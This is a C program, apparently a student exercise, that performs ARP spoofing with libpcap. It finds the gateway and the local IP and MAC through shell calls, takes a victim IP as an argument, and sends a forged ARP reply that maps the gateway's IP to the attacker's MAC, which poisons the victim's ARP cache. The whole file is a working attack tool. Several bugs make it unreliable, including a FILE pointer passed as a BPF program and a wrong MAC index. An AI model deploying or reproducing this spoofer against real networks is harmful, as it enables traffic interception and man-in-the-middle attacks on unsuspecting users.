#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <sys/types.h>
#define DLT_RAW 12
#define ETHER_ADDR_LEN 6
typedef struct ether_hdr {
    unsigned char   dh[ETHER_ADDR_LEN];
    unsigned char   sh[ETHER_ADDR_LEN];
    unsigned short  type;
} ETHER_HDR;
typedef struct arp_hdr
{
    unsigned short	ar_hrd;	    // Hardware type : ethernet
    unsigned short	ar_pro;     // Protocol		 : IP
    unsigned char	ar_hln;     // Hardware size
    unsigned char	ar_pln;     // Protocal size
    unsigned short	ar_op;      // Opcode replay
    unsigned char	ar_sha[6];  // Sender MAC
    unsigned char	ar_sip[4];  // Sender IP
    unsigned char	ar_tha[6];  // Target mac
    unsigned char	ar_tip[4];  // Target IP
} ARP_HDR;
typedef struct pk {
    ETHER_HDR etheh;
    ARP_HDR arph;
} pk;
int main(int argc, char *argv[])
{
    FILE *fp;
    FILE *fp1;
    FILE *fp2;
    int i=0;
    int j;
    char buf[100]={0};
    char gwip[30]={0};
    char myip[30]={0};
    char vicip[30]={0};
    char mymac1[30]={0};
    char mymac2[6]={0};
    unsigned char hexstr[18];
    char gwipc[12]={0};
    char myipc[12]={0};
    char vicipc[12]={0};
    unsigned int myipi,gwipi,vicipi;
    int socket_d, packet_offset;
    char *dev, errbuf[PCAP_ERRBUF_SIZE];
    char *myipp=&myipi;
    char *gwipp=&gwipi;
    char *vicipp=&vicipi;
    unsigned char mpk[42]={0};
    ETHER_HDR *packet = (ETHER_HDR *)malloc(sizeof(ETHER_HDR));
    ARP_HDR *packet2 = (ARP_HDR *)malloc(sizeof(ARP_HDR));
    memset(packet2, 0, sizeof(ARP_HDR));
    libnet_t *l;
    pcap_t *pp;
    pcap_t *handle;
    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;
    char filter_exp[] = "arp";
    bpf_u_int32 net;
    dev = pcap_lookupdev(errbuf);
        if (dev == NULL) {
            fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
            return(2);
        }
        pp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (pp == NULL) {
            fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
            return(2);
        }
    if((socket_d  = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1 ){
    perror("socket");}

    if (pcap_compile(pp, &fp, filter_exp, 0, net) == -1) {
        fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(pp));
        return(2);
    }
    if (pcap_setfilter(pp, &fp) == -1) {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(pp));
        return(2);
    }
    system("route > a.txt");
    fp=fopen("./a.txt","r");
    while(0<fscanf(fp,"%s",buf))
    {
        if(!strcmp(buf,"default"))
        {
            fscanf(fp,"%s",gwip);
            break;
        }
    }
    fclose(fp);
    system("./sh1.sh>b.txt");
    fp1=fopen("./b.txt","r");
    fscanf(fp1,"%s",myip);
    fclose(fp1);
    system("./sh2.sh>c.txt");
    fp2=fopen("./c.txt","r");
    fscanf(fp2,"%s",mymac1);
    fclose(fp2);
    myipi = inet_addr(myip);
    gwipi = inet_addr(gwip);
    vicipi = inet_addr(argv[1]);
    for(j=0;j<=5; j++)
    {
    sprintf(&hexstr[j*3],"%c%c\0",mymac1[i*3],mymac1[1+j*3]);
    }
    for(j=0; j<=5; j++)
    {
    packet->dh[j] = (unsigned char)htons(0xffff);
    }
    for(j=0; j<=5; j++)
    {
    packet->sh[j] = (unsigned char)strtol(&hexstr[j*3],NULL,16);
    }
    packet->type = (unsigned short)htons(0x0806);
    packet2->ar_hrd = (unsigned short)htons(1);
    packet2->ar_pro = (unsigned short)htons(0x0800);
    packet2->ar_hln = 6;
    packet2->ar_pln = 4;
    packet2->ar_op = (unsigned short)htons(1);
    for(j=0; j<=5; j++)
    {
    packet2->ar_sha[j] = (unsigned char)strtol(&hexstr[j*3],NULL,16);
    }
    for(j=0; j<=3; j++)
    {
    sprintf(&(packet2->ar_sip[j]),"%c\0",myipp[j]);
    }
    for(j=0; j<=3; j++)
    {
    sprintf(&(packet2->ar_tip[j]),"%c\0",gwipp[j]);
    }
    memcpy( mpk, (void *)packet, 14 );
    memcpy( mpk + 14, (void *)packet2, 28 );
    pcap_sendpacket(pp, mpk,42);
    for(j=0; j<=3; j++)
    {
    sprintf(&(packet2->ar_tip[j]),"%c\0",vicipp[j]);
    }
    memcpy( mpk, (void *)packet, 14 );
    memcpy( mpk + 14, (void *)packet2, 28 );
    pcap_sendpacket(pp, mpk,42);
    while(1)
    {
        pcap_next_ex(pp,&header,&pkt_data);
        if(((char)pkt_data[28]==(char)vicipp[0])&&((char)pkt_data[29]==(char)vicipp[1])&&((char)pkt_data[30]==(char)vicipp[2])&&((char)pkt_data[31]==(char)vicipp[3]))
            break;
    }
    for(j=0; j<=5; j++)
    {
    packet->dh[j] = pkt_data[6+j];
    }
    packet->type = (unsigned short)htons(0x0806);
    packet2->ar_hrd = (unsigned short)htons(1);
    packet2->ar_pro = (unsigned short)htons(0x0800);
    packet2->ar_hln = 6;
    packet2->ar_pln = 4;
    packet2->ar_op = (unsigned short)htons(2);
    for(j=0; j<=5; j++)
    {
    packet2->ar_sha[j] = (unsigned char)strtol(&hexstr[j*3],NULL,16);
    }
    for(j=0; j<=3; j++)
    {
    sprintf(&(packet2->ar_sip[j]),"%c\0",gwipp[j]);
    }
    for(j=0; j<=5; j++)
    {
    packet2->ar_tha[j] = pkt_data[6+j];
    }
    for(j=0; j<=3; j++)
    {
    sprintf(&(packet2->ar_tip[j]),"%c\0",vicipp[j]);
    }
    memcpy( mpk, (void *)packet, 14 );
    memcpy( mpk + 14, (void *)packet2, 28 );
    pcap_sendpacket(pp, mpk,42);
    return 0;
}
